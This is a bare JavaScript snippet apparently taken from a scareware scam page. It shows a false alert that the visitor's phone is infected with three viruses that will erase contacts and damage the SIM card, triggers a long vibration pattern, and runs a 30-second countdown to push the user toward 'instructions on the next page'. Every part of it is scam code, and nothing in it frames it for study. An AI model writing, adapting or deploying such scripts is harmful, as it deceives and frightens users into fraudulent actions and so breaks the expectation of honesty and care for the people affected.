alert("Warning: Your mobile device has been infected by (3) viruses! Viruses will damage your mobile phone, SIM card and erase all your contacts! Please follow the instructions on the next page to remove the viruses.")

! function() {
  navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate, navigator.vibrate([1e3, 500, 1e3, 500, 1e3, 500, 1e3, 500, 1e3, 500, 1e3, 500, 1e3, 500, 1e3, 500, 1e3])
}
();

var count = 30;
var counter = setInterval(timer, 1000);

function timer() {
  count = count - 1;
  if (count <= 0) {
    clearInterval(counter);
    return;
  }
  document.getElementById("timer").innerHTML = count;
}
